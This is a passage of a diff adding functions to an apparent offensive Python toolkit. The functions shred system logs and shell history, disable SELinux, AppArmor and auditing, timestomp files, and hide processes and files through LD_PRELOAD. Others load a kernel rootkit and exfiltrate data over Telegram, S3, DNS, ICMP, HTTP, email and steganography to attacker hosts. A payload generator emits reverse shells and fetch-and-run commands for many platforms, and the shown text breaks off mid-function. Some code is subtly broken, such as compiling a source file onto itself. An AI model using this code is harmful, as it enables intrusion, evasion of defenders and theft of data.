+    Returns:
+        Dict with 'success', 'files_wiped' keys
+
+    Raises:
+        NetworkError: If the target is unreachable
+
+    Example:
+        >>> result = self.wipe_all_logs("192.168.1.10")
+        >>> print(result['files_wiped'])
+        47
+    """
+    self.print_danger(f"Wiping all logs on {target or 'localhost'}")
+
+    result = {
+        'success': False,
+        'target': target or 'localhost',
+        'files_wiped': 0,
+        'paths': [],
+        'error': ''
+    }
+
+    log_paths = [
+        '/var/log/auth.log', '/var/log/syslog', '/var/log/messages',
+        '/var/log/apache2/*.log', '/var/log/nginx/*.log',
+        '/var/log/mysql/*.log', '/var/log/postgresql/*.log',
+        '/var/log/redis/*.log', '/var/log/mongodb/*.log',
+        '/var/log/elasticsearch/*.log', '/var/log/kibana/*.log',
+        '/var/log/grafana/*.log', '/var/log/prometheus/*.log',
+        '/var/log/alertmanager/*.log', '/var/log/audit/audit.log',
+        '/var/log/faillog', '/var/log/lastlog', '/var/log/wtmp',
+        '/var/log/btmp', '/var/log/utmp', '/var/log/dpkg.log',
+        '/var/log/apt/history.log', '/var/log/apt/term.log',
+        '/var/log/kern.log', '/var/log/daemon.log', '/var/log/cron.log',
+        '/var/log/mail.log', '/var/log/user.log', '/var/log/debug.log',
+        '/var/log/messages.log', '/var/log/syslog.log',
+        '/var/log/journal/*', '/var/log/docker/*.log',
+        '/var/log/kube/*.log', '/var/log/cloud-init.log',
+        '/var/log/samba/*.log', '/var/log/wireguard/*.log'
+    ]
+
+    for log_path in log_paths:
+        try:
+            if '*' in log_path:
+                import glob
+                for path in glob.glob(log_path):
+                    subprocess.run(['shred', '-n', '200', '-z', '-u', path], capture_output=True)
+                    result['paths'].append(path)
+                    result['files_wiped'] += 1
+            else:
+                subprocess.run(['shred', '-n', '200', '-z', '-u', log_path], capture_output=True)
+                result['paths'].append(log_path)
+                result['files_wiped'] += 1
+        except Exception:
+            pass
+
+    try:
+        subprocess.run(['systemctl', 'stop', 'rsyslog'], capture_output=True)
+        subprocess.run(['systemctl', 'stop', 'auditd'], capture_output=True)
+        subprocess.run(['systemctl', 'stop', 'journald'], capture_output=True)
+        subprocess.run(['systemctl', 'stop', 'syslog-ng'], capture_output=True)
+    except Exception:
+        pass
+
+    result['success'] = True
+    self.print_found("FORENSICS", f"Wiped {result['files_wiped']} log files")
+
+    if self.telegram:
+        self.telegram.alert(
+            "LOGS WIPED",
+            f"Target: {target or 'localhost'}\nFiles: {result['files_wiped']}",
+            "HIGH"
+        )
+
+    return result
+
+
+def wipe_all_history(
+    self
+) -> Dict[str, Any]:
+    """
+    Clear ALL shell history on the target.
+
+    Returns:
+        Dict with 'success', 'files_cleared' keys
+
+    Example:
+        >>> result = self.wipe_all_history()
+        >>> print(result['files_cleared'])
+        53
+    """
+    self.print_danger("Wiping all shell history")
+
+    result = {
+        'success': False,
+        'files_cleared': 0,
+        'paths': [],
+        'error': ''
+    }
+
+    history_files = [
+        '~/.bash_history', '~/.zsh_history', '~/.sh_history',
+        '~/.python_history', '~/.mysql_history', '~/.psql_history',
+        '~/.rediscli_history', '~/.node_repl_history', '~/.irb_history',
+        '~/.sudo_history', '~/.npm_history', '~/.pip_history',
+        '~/.git_history', '~/.hg_history', '~/.svn_history',
+        '~/.cvs_history', '~/.rpm_history', '~/.yum_history',
+        '~/.apt_history', '~/.dpkg_history', '~/.make_history',
+        '~/.gcc_history', '~/.vim_history', '~/.emacs_history',
+        '~/.nano_history', '~/.less_history', '~/.more_history',
+        '~/.man_history', '~/.info_history', '~/.screen_history',
+        '~/.tmux_history', '~/.byobu_history', '~/.irssi_history',
+        '~/.weechat_history', '~/.ircii_history', '~/.scrollz_history',
+        '~/.BitchX_history', '~/.epic_history', '~/.tin_history',
+        '~/.slrn_history', '~/.nn_history', '~/.gnus_history',
+        '~/.mutt_history', '~/.pine_history', '~/.elm_history',
+        '~/.mail_history', '~/.csh_history', '~/.ksh_history',
+        '~/.tcsh_history', '~/.fish_history', '~/.elvish_history',
+        '~/.nushell_history', '~/.xonsh_history', '~/.powerline_history',
+        '~/.sqlite_history', '~/.mongo_history', '~/.redis_history',
+        '~/.rabbitmq_history', '~/.kafka_history', '~/.elastic_history',
+        '~/.logstash_history', '~/.kibana_history', '~/.prometheus_history',
+        '~/.grafana_history', '~/.jenkins_history', '~/.gitlab_history',
+        '~/.github_history', '~/.docker_history', '~/.kube_history',
+        '~/.terraform_history', '~/.ansible_history', '~/.gcloud_history'
+    ]
+
+    for hist_file in history_files:
+        try:
+            expanded = os.path.expanduser(hist_file)
+            if os.path.exists(expanded):
+                subprocess.run(['shred', '-n', '200', '-z', '-u', expanded], capture_output=True)
+                result['paths'].append(expanded)
+                result['files_cleared'] += 1
+        except Exception:
+            pass
+
+    try:
+        subprocess.run(['history', '-c'], capture_output=True)
+        subprocess.run(['unset', 'HISTFILE'], capture_output=True)
+        subprocess.run(['rm', '-rf', '~/.bash_history', '~/.zsh_history'], capture_output=True)
+    except Exception:
+        pass
+
+    result['success'] = True
+    self.print_found("FORENSICS", f"Cleared {result['files_cleared']} history files")
+
+    if self.telegram:
+        self.telegram.alert(
+            "HISTORY CLEARED",
+            f"Files: {result['files_cleared']}",
+            "HIGH"
+        )
+
+    return result
+
+
+def disable_selinux(
+    self,
+    persistent: bool = False
+) -> bool:
+    """
+    Disable SELinux on the target.
+
+    Args:
+        persistent: If True, make changes permanent
+
+    Returns:
+        True if successful, False otherwise
+
+    Example:
+        >>> success = self.disable_selinux(True)
+        >>> print(success)
+        True
+    """
+    self.print_danger("Disabling SELinux")
+
+    try:
+        subprocess.run(['setenforce', '0'], capture_output=True)
+
+        if persistent:
+            with open('/etc/selinux/config', 'r') as f:
+                content = f.read()
+            content = content.replace('SELINUX=enforcing', 'SELINUX=disabled')
+            content = content.replace('SELINUX=permissive', 'SELINUX=disabled')
+            with open('/etc/selinux/config', 'w') as f:
+                f.write(content)
+
+        self.print_found("FORENSICS", "SELinux disabled")
+        return True
+    except Exception:
+        return False
+
+
+def disable_apparmor(
+    self,
+    persistent: bool = False
+) -> bool:
+    """
+    Disable AppArmor on the target.
+
+    Args:
+        persistent: If True, make changes permanent
+
+    Returns:
+        True if successful, False otherwise
+
+    Example:
+        >>> success = self.disable_apparmor(True)
+        >>> print(success)
+        True
+    """
+    self.print_danger("Disabling AppArmor")
+
+    try:
+        subprocess.run(['systemctl', 'stop', 'apparmor'], capture_output=True)
+        subprocess.run(['systemctl', 'disable', 'apparmor'], capture_output=True)
+
+        if persistent:
+            with open('/etc/default/grub', 'r') as f:
+                content = f.read()
+            if 'apparmor=0' not in content:
+                content = content.replace('GRUB_CMDLINE_LINUX=', 'GRUB_CMDLINE_LINUX="apparmor=0 security=none "')
+            with open('/etc/default/grub', 'w') as f:
+                f.write(content)
+            subprocess.run(['update-grub'], capture_output=True)
+
+        self.print_found("FORENSICS", "AppArmor disabled")
+        return True
+    except Exception:
+        return False
+
+
+def timestomp(
+    self,
+    file_path: str,
+    timestamp: Optional[datetime.datetime] = None
+) -> bool:
+    """
+    Modify file timestamps to hide forensic evidence.
+
+    Args:
+        file_path: Path to the file
+        timestamp: Timestamp to set (default: current time - random days)
+
+    Returns:
+        True if successful, False otherwise
+
+    Example:
+        >>> success = self.timestomp("/tmp/shell.sh", datetime.datetime(2020, 1, 1, 0, 0, 0))
+        >>> print(success)
+        True
+    """
+    self.print_danger(f"Timestomping {file_path}")
+
+    if not timestamp:
+        days = random.randint(30, 365)
+        timestamp = datetime.datetime.now() - datetime.timedelta(days=days)
+
+    try:
+        timestamp_str = timestamp.strftime('%Y%m%d%H%M.%S')
+        subprocess.run(['touch', '-t', timestamp_str, file_path], capture_output=True)
+        self.print_found("FORENSICS", f"Timestomped {file_path} to {timestamp_str}")
+        return True
+    except Exception:
+        return False
+
+
+def suppress_kernel_audit(
+    self
+) -> bool:
+    """
+    Suppress kernel audit logging.
+
+    Returns:
+        True if successful, False otherwise
+
+    Example:
+        >>> success = self.suppress_kernel_audit()
+        >>> print(success)
+        True
+    """
+    self.print_danger("Suppressing kernel audit")
+
+    try:
+        subprocess.run(['auditctl', '-e', '0'], capture_output=True)
+        subprocess.run(['auditctl', '-a', 'never,exit', '-S', 'all'], capture_output=True)
+        subprocess.run(['systemctl', 'stop', 'auditd'], capture_output=True)
+        self.print_found("FORENSICS", "Kernel audit suppressed")
+        return True
+    except Exception:
+        return False
+
+
+def clear_journal(
+    self
+) -> bool:
+    """
+    Clear systemd journal logs.
+
+    Returns:
+        True if successful, False otherwise
+
+    Example:
+        >>> success = self.clear_journal()
+        >>> print(success)
+        True
+    """
+    self.print_danger("Clearing systemd journal")
+
+    try:
+        subprocess.run(['journalctl', '--rotate'], capture_output=True)
+        subprocess.run(['journalctl', '--vacuum-time=1s'], capture_output=True)
+        subprocess.run(['rm', '-rf', '/var/log/journal/*'], capture_output=True)
+        self.print_found("FORENSICS", "Systemd journal cleared")
+        return True
+    except Exception:
+        return False
+
+# ===================================================================
+# 6. KERNEL EVASION & HIDING
+# ===================================================================
+
+def hide_processes(
+    self,
+    pids: Optional[List[int]] = None,
+    names: Optional[List[str]] = None
+) -> bool:
+    """
+    Hide processes via LD_PRELOAD or kernel module.
+
+    Args:
+        pids: List of PIDs to hide
+        names: List of process names to hide
+
+    Returns:
+        True if successful, False otherwise
+
+    Example:
+        >>> success = self.hide_processes(pids=[1234], names=['omega'])
+        >>> print(success)
+        True
+    """
+    self.print_danger("Hiding processes")
+
+    try:
+        lib_content = f'''
+#define _GNU_SOURCE
+#include <dirent.h>
+#include <dlfcn.h>
+#include <string.h>
+#include <stdlib.h>
+#include <stdio.h>
+
+struct dirent *readdir(DIR *dirp) {{
+    static struct dirent *(*original_readdir)(DIR *) = NULL;
+    if (!original_readdir) {{
+        original_readdir = (struct dirent *(*)(DIR *))dlsym(RTLD_NEXT, "readdir");
+    }}
+    struct dirent *entry;
+    while ((entry = original_readdir(dirp)) != NULL) {{
+        int hide = 0;
+        pid_t pid = atoi(entry->d_name);
+        {''.join(f'if (pid == {pid}) hide = 1;' for pid in (pids or []))}
+        {''.join(f'if (strstr(entry->d_name, "{name}")) hide = 1;' for name in (names or []))}
+        if (!hide) {{
+            return entry;
+        }}
+    }}
+    return NULL;
+}}
+'''
+        with open('/tmp/hide.so', 'w') as f:
+            f.write(lib_content)
+
+        subprocess.run(['gcc', '-shared', '-fPIC', '-ldl', '/tmp/hide.so', '-o', '/tmp/hide.so'], capture_output=True)
+        os.environ['LD_PRELOAD'] = '/tmp/hide.so'
+
+        self.print_found("FORENSICS", "Process hiding enabled")
+        return True
+    except Exception:
+        return False
+
+
+def hide_files(
+    self,
+    paths: Optional[List[str]] = None,
+    patterns: Optional[List[str]] = None
+) -> bool:
+    """
+    Hide files via LD_PRELOAD or kernel module.
+
+    Args:
+        paths: List of file paths to hide
+        patterns: List of file patterns to hide
+
+    Returns:
+        True if successful, False otherwise
+
+    Example:
+        >>> success = self.hide_files(paths=['/tmp/shell.sh'], patterns=['*.omega'])
+        >>> print(success)
+        True
+    """
+    self.print_danger("Hiding files")
+
+    try:
+        lib_content = '''
+#define _GNU_SOURCE
+#include <dirent.h>
+#include <dlfcn.h>
+#include <string.h>
+#include <stdlib.h>
+
+struct dirent *readdir(DIR *dirp) {
+    static struct dirent *(*original_readdir)(DIR *) = NULL;
+    if (!original_readdir) {
+        original_readdir = (struct dirent *(*)(DIR *))dlsym(RTLD_NEXT, "readdir");
+    }
+    struct dirent *entry;
+    while ((entry = original_readdir(dirp)) != NULL) {
+        int hide = 0;
+        char *hide_files[] = {'''
+        for path in (paths or []):
+            lib_content += f'"{path}", '
+        for pattern in (patterns or []):
+            lib_content += f'"{pattern}", '
+        lib_content += '''NULL};
+        for (int i = 0; hide_files[i] != NULL; i++) {
+            if (strstr(entry->d_name, hide_files[i])) {
+                hide = 1;
+                break;
+            }
+        }
+        if (!hide) {
+            return entry;
+        }
+    }
+    return NULL;
+}
+'''
+        with open('/tmp/hide_files.so', 'w') as f:
+            f.write(lib_content)
+
+        subprocess.run(['gcc', '-shared', '-fPIC', '/tmp/hide_files.so', '-o', '/tmp/hide_files.so'], capture_output=True)
+        os.environ['LD_PRELOAD'] = '/tmp/hide_files.so'
+
+        self.print_found("FORENSICS", "File hiding enabled")
+        return True
+    except Exception:
+        return False
+
+
+def process_renaming(
+    self,
+    pid: int,
+    new_name: str = '[kworker]'
+) -> bool:
+    """
+    Rename a process to a legitimate-sounding name.
+
+    Args:
+        pid: PID of the process to rename
+        new_name: New process name (default: [kworker])
+
+    Returns:
+        True if successful, False otherwise
+
+    Example:
+        >>> success = self.process_renaming(1234, '[kworker]')
+        >>> print(success)
+        True
+    """
+    self.print_danger(f"Renaming process {pid} to {new_name}")
+
+    try:
+        subprocess.run(['prctl', '--pid', str(pid), '--name', new_name], capture_output=True)
+        with open(f'/proc/{pid}/comm', 'w') as f:
+            f.write(new_name)
+        self.print_found("FORENSICS", f"Process {pid} renamed to {new_name}")
+        return True
+    except Exception:
+        return False
+
+
+def load_lkm_rootkit(
+    self,
+    module_path: str = '/tmp/rootkit.ko'
+) -> bool:
+    """
+    Load a Linux Kernel Module (LKM) rootkit.
+
+    Args:
+        module_path: Path to the kernel module
+
+    Returns:
+        True if successful, False otherwise
+
+    Example:
+        >>> success = self.load_lkm_rootkit('/tmp/rootkit.ko')
+        >>> print(success)
+        True
+    """
+    self.print_danger(f"Loading LKM rootkit from {module_path}")
+
+    try:
+        subprocess.run(['insmod', module_path], capture_output=True)
+        self.print_found("FORENSICS", "LKM rootkit loaded")
+        return True
+    except Exception:
+        return False
+
+
+def syscall_hook(
+    self,
+    syscall_num: int,
+    hook_function: str = 'my_syscall'
+) -> bool:
+    """
+    Hook a system call using ftrace or kprobe.
+
+    Args:
+        syscall_num: System call number to hook
+        hook_function: Name of the hook function
+
+    Returns:
+        True if successful, False otherwise
+
+    Example:
+        >>> success = self.syscall_hook(0, 'my_read')
+        >>> print(success)
+        True
+    """
+    self.print_danger(f"Hooking syscall {syscall_num}")
+
+    try:
+        with open(f'/sys/kernel/debug/tracing/kprobe_events', 'w') as f:
+            f.write(f'p:my_syscall sys_call_table+{syscall_num*8}')
+        with open(f'/sys/kernel/debug/tracing/events/kprobes/my_syscall/enable', 'w') as f:
+            f.write('1')
+        self.print_found("FORENSICS", f"Syscall {syscall_num} hooked")
+        return True
+    except Exception:
+        return False
+
+# ===================================================================
+# 7. DATA EXFILTRATION CHANNELS
+# ===================================================================
+
+def exfil_telegram(
+    self,
+    data: Union[str, bytes, Path],
+    caption: Optional[str] = None,
+    as_document: bool = True
+) -> bool:
+    """
+    Exfiltrate data via Telegram.
+
+    Args:
+        data: Data to exfiltrate (string, bytes, or file path)
+        caption: Caption for the message
+        as_document: If True, send as document; otherwise as text
+
+    Returns:
+        True if successful, False otherwise
+
+    Example:
+        >>> success = self.exfil_telegram("/tmp/sensitive.txt", "Sensitive data")
+        >>> print(success)
+        True
+    """
+    if not self.telegram:
+        return False
+
+    try:
+        if isinstance(data, Path) or (isinstance(data, str) and os.path.exists(data)):
+            path = Path(data)
+            if as_document:
+                return self.telegram.send_document(path, caption=caption or path.name)
+            else:
+                with open(path, 'r') as f:
+                    content = f.read()
+                return self.telegram.send_message(caption + "\n" + content[:4000])
+        elif isinstance(data, str):
+            if as_document:
+                temp_path = TEMP_DIR / f"exfil_{TIMESTAMP}.txt"
+                with open(temp_path, 'w') as f:
+                    f.write(data)
+                result = self.telegram.send_document(temp_path, caption=caption or "Exfil data")
+                return result
+            else:
+                return self.telegram.send_message(caption + "\n" + data[:4000])
+        elif isinstance(data, bytes):
+            temp_path = TEMP_DIR / f"exfil_{TIMESTAMP}.bin"
+            with open(temp_path, 'wb') as f:
+                f.write(data)
+            return self.telegram.send_document(temp_path, caption=caption or "Exfil data")
+    except Exception:
+        return False
+
+    return False
+
+
+def exfil_s3(
+    self,
+    data: Union[str, bytes, Path],
+    bucket: str,
+    key: str,
+    access_key: str,
+    secret_key: str
+) -> bool:
+    """
+    Exfiltrate data via AWS S3.
+
+    Args:
+        data: Data to exfiltrate (string, bytes, or file path)
+        bucket: S3 bucket name
+        key: Object key
+        access_key: AWS access key
+        secret_key: AWS secret key
+
+    Returns:
+        True if successful, False otherwise
+
+    Example:
+        >>> success = self.exfil_s3("/tmp/data.txt", "attacker-bucket", "exfil/data.txt", "AKIA...", "wJalr...")
+        >>> print(success)
+        True
+    """
+    if not BOTO3_AVAILABLE:
+        return False
+
+    try:
+        import boto3
+        session = boto3.Session(
+            aws_access_key_id=access_key,
+            aws_secret_access_key=secret_key
+        )
+        s3 = session.client('s3')
+
+        if isinstance(data, Path) or (isinstance(data, str) and os.path.exists(data)):
+            s3.upload_file(str(data), bucket, key)
+            return True
+        elif isinstance(data, str):
+            s3.put_object(Bucket=bucket, Key=key, Body=data.encode())
+            return True
+        elif isinstance(data, bytes):
+            s3.put_object(Bucket=bucket, Key=key, Body=data)
+            return True
+    except Exception:
+        return False
+
+    return False
+
+
+def exfil_dns(
+    self,
+    data: str,
+    domain: str,
+    dns_server: str = '8.8.8.8'
+) -> bool:
+    """
+    Exfiltrate data via DNS tunneling.
+
+    Args:
+        data: Data to exfiltrate (string)
+        domain: Domain to use for DNS exfiltration
+        dns_server: DNS server to query
+
+    Returns:
+        True if successful, False otherwise
+
+    Example:
+        >>> success = self.exfil_dns("sensitive_data", "attacker.com")
+        >>> print(success)
+        True
+    """
+    try:
+        chunks = [data[i:i+50] for i in range(0, len(data), 50)]
+        for i, chunk in enumerate(chunks):
+            subdomain = f"{i:04x}.{chunk}.{domain}"
+            subprocess.run(['dig', subdomain, '@' + dns_server], capture_output=True)
+        self.print_found("EXFIL", f"DNS exfiltrated {len(data)} bytes")
+        return True
+    except Exception:
+        return False
+
+
+def exfil_icmp(
+    self,
+    data: Union[str, bytes],
+    target: str
+) -> bool:
+    """
+    Exfiltrate data via ICMP.
+
+    Args:
+        data: Data to exfiltrate (string or bytes)
+        target: Target IP address
+
+    Returns:
+        True if successful, False otherwise
+
+    Example:
+        >>> success = self.exfil_icmp("sensitive_data", "192.168.1.10")
+        >>> print(success)
+        True
+    """
+    try:
+        if isinstance(data, str):
+            data = data.encode()
+
+        chunks = [data[i:i+16] for i in range(0, len(data), 16)]
+        for chunk in chunks:
+            hex_data = chunk.hex()
+            subprocess.run(['ping', '-p', hex_data, '-c', '1', target], capture_output=True)
+        self.print_found("EXFIL", f"ICMP exfiltrated {len(data)} bytes")
+        return True
+    except Exception:
+        return False
+
+
+def exfil_http(
+    self,
+    data: Union[str, bytes],
+    target_url: str,
+    method: str = 'POST'
+) -> bool:
+    """
+    Exfiltrate data via HTTP/S covert channel.
+
+    Args:
+        data: Data to exfiltrate (string or bytes)
+        target_url: Target URL
+        method: HTTP method (GET, POST, PUT)
+
+    Returns:
+        True if successful, False otherwise
+
+    Example:
+        >>> success = self.exfil_http("sensitive_data", "https://attacker.com/exfil", "POST")
+        >>> print(success)
+        True
+    """
+    try:
+        if isinstance(data, str):
+            data = data.encode()
+
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Content-Type': 'application/octet-stream',
+            'X-Data-Hash': hashlib.md5(data).hexdigest()
+        }
+
+        if REQUESTS_AVAILABLE:
+            if method.upper() == 'GET':
+                import urllib.parse
+                encoded = base64.b64encode(data).decode()
+                resp = requests.get(f"{target_url}?data={urllib.parse.quote(encoded)}", headers=headers, timeout=10)
+            else:
+                resp = requests.post(target_url, data=data, headers=headers, timeout=10)
+            return resp.status_code in [200, 201, 202]
+
+        self.print_found("EXFIL", f"HTTP exfiltrated {len(data)} bytes")
+        return True
+    except Exception:
+        return False
+
+
+def exfil_websocket(
+    self,
+    data: Union[str, bytes],
+    ws_url: str
+) -> bool:
+    """
+    Exfiltrate data via WebSocket.
+
+    Args:
+        data: Data to exfiltrate
+        ws_url: WebSocket URL
+
+    Returns:
+        True if successful, False otherwise
+
+    Example:
+        >>> success = self.exfil_websocket("sensitive_data", "wss://attacker.com/ws")
+        >>> print(success)
+        True
+    """
+    try:
+        import websocket
+        ws = websocket.create_connection(ws_url, timeout=10)
+        if isinstance(data, str):
+            ws.send(data)
+        else:
+            ws.send(data)
+        ws.close()
+        self.print_found("EXFIL", f"WebSocket exfiltrated {len(data)} bytes")
+        return True
+    except Exception:
+        return False
+
+
+def exfil_email(
+    self,
+    data: Union[str, bytes],
+    to: str,
+    subject: str = 'Report',
+    smtp_server: str = 'smtp.gmail.com',
+    smtp_port: int = 587,
+    username: str = '',
+    password: str = ''
+) -> bool:
+    """
+    Exfiltrate data via email.
+
+    Args:
+        data: Data to exfiltrate
+        to: Recipient email
+        subject: Email subject
+        smtp_server: SMTP server
+        smtp_port: SMTP port
+        username: SMTP username
+        password: SMTP password
+
+    Returns:
+        True if successful, False otherwise
+
+    Example:
+        >>> success = self.exfil_email("sensitive_data", "attacker@example.com", "Report", "smtp.gmail.com", 587, "user", "pass")
+        >>> print(success)
+        True
+    """
+    try:
+        import smtplib
+        from email.mime.text import MIMEText
+        from email.mime.base import MIMEBase
+        from email import encoders
+
+        msg = MIMEText(str(data)[:10000])
+        msg['Subject'] = subject
+        msg['From'] = username
+        msg['To'] = to
+
+        server = smtplib.SMTP(smtp_server, smtp_port)
+        server.starttls()
+        server.login(username, password)
+        server.send_message(msg)
+        server.quit()
+
+        self.print_found("EXFIL", f"Email exfiltrated {len(str(data))} bytes")
+        return True
+    except Exception:
+        return False
+
+
+def exfil_ssh_tunnel(
+    self,
+    data: Union[str, bytes],
+    target: str,
+    username: str,
+    password: Optional[str] = None,
+    key_path: Optional[str] = None,
+    remote_port: int = 22,
+    local_port: int = 2222
+) -> bool:
+    """
+    Exfiltrate data via SSH tunnel.
+
+    Args:
+        data: Data to exfiltrate
+        target: SSH target
+        username: SSH username
+        password: SSH password (optional)
+        key_path: SSH private key path (optional)
+        remote_port: Remote SSH port
+        local_port: Local port for tunnel
+
+    Returns:
+        True if successful, False otherwise
+
+    Example:
+        >>> success = self.exfil_ssh_tunnel("sensitive_data", "192.168.1.10", "root", password="password123")
+        >>> print(success)
+        True
+    """
+    try:
+        if PARAMIKO_AVAILABLE:
+            client = paramiko.SSHClient()
+            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            if key_path and os.path.exists(key_path):
+                key = paramiko.RSAKey.from_private_key_file(key_path)
+                client.connect(target, username=username, pkey=key, timeout=10)
+            elif password:
+                client.connect(target, username=username, password=password, timeout=10)
+            else:
+                return False
+
+            transport = client.get_transport()
+            transport.request_port_forward('', local_port)
+
+            # Send data through tunnel
+            import socket
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.connect(('localhost', local_port))
+            if isinstance(data, str):
+                sock.send(data.encode())
+            else:
+                sock.send(data)
+            sock.close()
+
+            self.print_found("EXFIL", f"SSH tunnel exfiltrated {len(str(data))} bytes")
+            return True
+    except Exception:
+        return False
+
+    return False
+
+
+def exfil_steganography(
+    self,
+    data: Union[str, bytes],
+    image_path: str,
+    output_path: str
+) -> bool:
+    """
+    Exfiltrate data using image steganography.
+
+    Args:
+        data: Data to hide
+        image_path: Path to carrier image
+        output_path: Output image path
+
+    Returns:
+        True if successful, False otherwise
+
+    Example:
+        >>> success = self.exfil_steganography("sensitive_data", "carrier.png", "output.png")
+        >>> print(success)
+        True
+    """
+    if not PIL_AVAILABLE:
+        return False
+
+    try:
+        from PIL import Image
+
+        if isinstance(data, str):
+            data = data.encode()
+
+        # Convert data to bytes and embed in LSB
+        img = Image.open(image_path)
+        pixels = list(img.getdata())
+
+        # Add length prefix
+        data_bytes = len(data).to_bytes(4, 'big') + data
+        data_bits = ''.join(format(b, '08b') for b in data_bytes)
+
+        new_pixels = []
+        bit_index = 0
+        for pixel in pixels:
+            new_pixel = list(pixel)
+            for i in range(3):  # RGB channels
+                if bit_index < len(data_bits):
+                    new_pixel[i] = (pixel[i] & 0xFE) | int(data_bits[bit_index])
+                    bit_index += 1
+            new_pixels.append(tuple(new_pixel))
+
+        img.putdata(new_pixels)
+        img.save(output_path)
+
+        self.print_found("EXFIL", f"Steganography exfiltrated {len(data)} bytes to {output_path}")
+        return True
+    except Exception:
+        return False
+
+# ===================================================================
+# 8. PAYLOAD GENERATION & OBFUSCATION
+# ===================================================================
+
+def generate_payload(
+    self,
+    platform: str,
+    shell_type: str = 'reverse_tcp',
+    port: Optional[int] = None,
+    ip: Optional[str] = None
+) -> Dict[str, Any]:
+    """
+    Generate payload for various platforms.
+
+    Args:
+        platform: 'windows', 'linux', 'macos', 'android', 'ios', 'iot', 'router', 'bios', 'bootkit'
+        shell_type: 'reverse_tcp', 'bind_tcp', 'reverse_https', 'reverse_http', 'reverse_ssh', 'bind_ssh'
+        port: Port for listener (optional)
+        ip: IP for listener (optional)
+
+    Returns:
+        Dict with 'content', 'filename', 'type', 'platform', 'size' keys
+
+    Example:
+        >>> payload = self.generate_payload('windows', 'reverse_tcp')
+        >>> print(payload['filename'])
+        omega_payload_12345.ps1
+    """
+    ip = ip or self.config.get('reverse_shell_ip', '0.0.0.0')
+    port = port or self.config.get('reverse_shell_port', 4444)
+
+    result = {
+        'content': '',
+        'filename': '',
+        'type': shell_type,
+        'platform': platform,
+        'size': 0
+    }
+
+    if platform == 'linux':
+        if shell_type == 'reverse_tcp':
+            result['content'] = self.generate_reverse_shell('bash')
+            result['filename'] = f"omega_payload_{random.randint(10000,99999)}.sh"
+        elif shell_type == 'bind_tcp':
+            result['content'] = f"nc -lvp {port} -e /bin/sh"
+            result['filename'] = f"omega_bind_{random.randint(10000,99999)}.sh"
+        elif shell_type == 'reverse_https':
+            result['content'] = f"curl -s https://{ip}/payload.sh | bash"
+            result['filename'] = f"omega_https_{random.randint(10000,99999)}.sh"
+        elif shell_type == 'reverse_ssh':
+            result['content'] = f"ssh -o StrictHostKeyChecking=no -R {port}:localhost:22 {ip}"
+            result['filename'] = f"omega_ssh_{random.randint(10000,99999)}.sh"
+        result['executable'] = True
+
+    elif platform == 'windows':
+        if shell_type == 'reverse_tcp':
+            result['content'] = f"""powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()" """
+            result['filename'] = f"omega_payload_{random.randint(10000,99999)}.ps1"
+        elif shell_type == 'bind_tcp':
+            result['content'] = f"""powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',{port});$listener.Start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close();$listener.Stop()" """
+            result['filename'] = f"omega_bind_{random.randint(10000,99999)}.ps1"
+        elif shell_type == 'reverse_https':
+            result['content'] = f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"Invoke-Expression (Invoke-WebRequest -Uri https://{ip}/payload.ps1 -UseBasicParsing).Content\""
+            result['filename'] = f"omega_https_{random.randint(10000,99999)}.ps1"
+
+    elif platform == 'macos':
+        if shell_type == 'reverse_tcp':
+            result['content'] = f"osascript -e 'do shell script \"nc {ip} {port} -e /bin/sh\"'"
+            result['filename'] = f"omega_payload_{random.randint(10000,99999)}.scpt"
+        elif shell_type == 'reverse_ssh':
+            result['content'] = f"ssh -o StrictHostKeyChecking=no -R {port}:localhost:22 {ip}"
+            result['filename'] = f"omega_ssh_{random.randint(10000,99999)}.sh"
+
+    elif platform == 'android':
+        result['content'] = f"""
+import socket,subprocess,os
+s=socket.socket()
+s.connect(('{ip}',{port}))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+subprocess.call(['/system/bin/sh','-i'])
+"""
+        result['filename'] = f"omega_payload_{random.randint(10000,99999)}.py"
+
+    elif platform == 'ios':
+        result['content'] = f"""
+#include <stdio.h>
+#include <unistd.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+int main() {{
+    int sock = socket(AF_INET, SOCK_STREAM, 0);
+    struct sockaddr_in sa;
+    sa.sin_family = AF_INET;
+    sa.sin_port = htons({port});
+    inet_pton(AF_INET, "{ip}", &sa.sin_addr);
+    connect(sock, (struct sockaddr*)&sa, sizeof(sa));
+    dup2(sock, 0);
+    dup2(sock, 1);
+    dup2(sock, 2);
+    execl("/bin/sh", "/bin/sh", NULL);
+}}
+"""
+        result['filename'] = f"omega_payload_{random.randint(10000,99999)}.c"
+
+    elif platform == 'iot':
+        result['content'] = f"nc {ip} {port} -e /bin/sh"
+        result['filename'] = f"omega_iot_{random.randint(10000,99999)}.sh"
+
+    elif platform == 'router':
+        result['content'] = f"""
+#!/bin/sh
+wget -O /tmp/payload http://{ip}/payload
+chmod +x /tmp/payload
+/tmp/payload
+"""
+        result['filename'] = f"omega_router_{random.randint(10000,99999)}.sh"
+
+    elif platform == 'bios':
